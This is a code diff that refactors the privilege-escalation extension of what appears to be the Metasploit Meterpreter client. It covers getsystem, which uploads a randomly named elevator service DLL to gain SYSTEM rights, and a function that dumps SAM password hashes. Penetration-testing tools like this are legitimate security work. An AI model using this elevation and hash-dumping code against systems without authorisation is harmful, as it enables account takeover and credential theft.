@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'rex/post/meterpreter/extensions/priv/tlv'
+require 'rex/post/meterpreter/extensions/priv/command_ids'
 require 'rex/post/meterpreter/extensions/priv/passwd'
 require 'rex/post/meterpreter/extensions/priv/fs'
 
@@ -18,6 +19,10 @@ module Priv
 #
 ###
 class Priv < Extension
+
+  def self.extension_id
+    EXTENSION_ID_PRIV
+  end
 
   #
   # Initializes the privilege escalationextension.
@@ -40,51 +45,57 @@ class Priv < Extension
   #
   # Attempt to elevate the meterpreter to Local SYSTEM
   #
-  def getsystem( technique=0 )
-    request = Packet.create_request( 'priv_elevate_getsystem' )
+  def getsystem(technique=0)
+    request = Packet.create_request(COMMAND_ID_PRIV_ELEVATE_GETSYSTEM)
 
-    elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
+    # We only need the elevate DLL for when we're invoking the tokendup
+    # method, which we'll only use if required (ie. trying all or when
+    # that metdho is asked for explicitly)
+    if [0, 3].include?(technique)
+      elevator_name = Rex::Text.rand_text_alpha_lower(6)
 
-    elevator_path = nil
-    client.binary_suffix.each { |s|
-      elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
-      if !elevator_path.nil?
-        break
-      end
-    }
-    if elevator_path.nil?
-      elevators = ""
+      elevator_path = nil
       client.binary_suffix.each { |s|
-        elevators << "elevator.#{s}, "
+        elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
+        if !elevator_path.nil?
+          break
+        end
       }
-      raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
+      if elevator_path.nil?
+        elevators = ''
+        client.binary_suffix.each { |s|
+          elevators << "elevator.#{s}, "
+        }
+        raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
+      end
+
+      elevator_data = ''
+
+      ::File.open(elevator_path, 'rb') { |f|
+        elevator_data += f.read(f.stat.size)
+      }
+
+      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name)
+      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data)
+      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length)
     end
 
-    elevator_data = ""
-
-    ::File.open( elevator_path, "rb" ) { |f|
-      elevator_data += f.read( f.stat.size )
-    }
-
-    request.add_tlv( TLV_TYPE_ELEVATE_TECHNIQUE, technique )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
+    request.add_tlv(TLV_TYPE_ELEVATE_TECHNIQUE, technique)
 
     # as some service routines can be slow we bump up the timeout to 90 seconds
-    response = client.send_request( request, 90 )
+    response = client.send_request(request, 90)
 
-    technique = response.get_tlv_value( TLV_TYPE_ELEVATE_TECHNIQUE )
+    technique = response.get_tlv_value(TLV_TYPE_ELEVATE_TECHNIQUE)
 
-    if( response.result == 0 and technique != nil )
-      client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
+    if(response.result == 0 and technique != nil)
+      client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')
       client.update_session_info
       client.sys.config.getprivs
       if client.framework.db and client.framework.db.active
         client.framework.db.report_note(
           :host => client.sock.peerhost,
           :workspace => client.framework.db.workspace,
-          :type => "meterpreter.getsystem",
+          :type => 'meterpreter.getsystem',
           :data => {:technique => technique}
         ) rescue nil
       end
@@ -99,7 +110,7 @@ class Priv < Extension
   #
   def sam_hashes
     # This can take a long long time for large domain controls, bump the timeout to one hour
-    response = client.send_request(Packet.create_request('priv_passwd_get_sam_hashes'), 3600)
+    response = client.send_request(Packet.create_request(COMMAND_ID_PRIV_PASSWD_GET_SAM_HASHES), 3600)
 
     response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash|
       SamUser.new(hash)
